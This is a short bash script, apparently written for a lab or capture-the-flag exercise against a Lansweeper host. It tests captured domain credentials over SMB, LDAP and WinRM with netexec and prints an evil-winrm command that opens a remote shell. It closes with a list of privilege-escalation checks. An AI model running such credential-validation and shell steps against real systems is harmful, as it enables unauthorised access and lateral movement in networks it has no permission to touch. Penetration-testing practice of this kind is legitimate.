#!/bin/bash
# Lansweeper Assessment - Validate Captured Credentials
# Usage: ./validate-captured-creds.sh <dc_host> <username> <password>

set -e

if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ]; then
    echo "Usage: $0 <dc_host> <username> <password>"
    echo "Example: $0 inventory.sweep.vl svc_inventory_lnx 'captured_password'"
    exit 1
fi

DC_HOST="$1"
USERNAME="$2"
PASSWORD="$3"

echo "[*] Validating captured Lansweeper credentials"
echo "[*] Target: ${DC_HOST}"
echo "[*] User: ${USERNAME}"
echo ""

# Test SMB access
echo "[+] Testing SMB access..."
if netexec smb "${DC_HOST}" -u "${USERNAME}" -p "${PASSWORD}" 2>&1 | grep -q "SUCCESS"; then
    echo "    ✓ SMB authentication successful"
else
    echo "    ✗ SMB authentication failed"
fi

# Test LDAP access
echo "[+] Testing LDAP access..."
if netexec ldap "${DC_HOST}" -u "${USERNAME}" -p "${PASSWORD}" 2>&1 | grep -q "SUCCESS"; then
    echo "    ✓ LDAP authentication successful"
else
    echo "    ✗ LDAP authentication failed"
fi

# Test WinRM access
echo "[+] Testing WinRM access..."
if netexec winrm "${DC_HOST}" -u "${USERNAME}" -p "${PASSWORD}" 2>&1 | grep -q "SUCCESS"; then
    echo "    ✓ WinRM authentication successful"
    echo ""
    echo "[+] Interactive shell available via:"
    echo "    evil-winrm -i ${DC_HOST} -u ${USERNAME} -p '${PASSWORD}'"
else
    echo "    ✗ WinRM authentication failed"
fi

echo ""
echo "[+] If credentials work, check for:"
echo "    - Membership in 'Lansweeper Admins' group"
echo "    - GenericAll on privileged groups (use BloodHound)"
echo "    - Local admin rights on managed hosts"
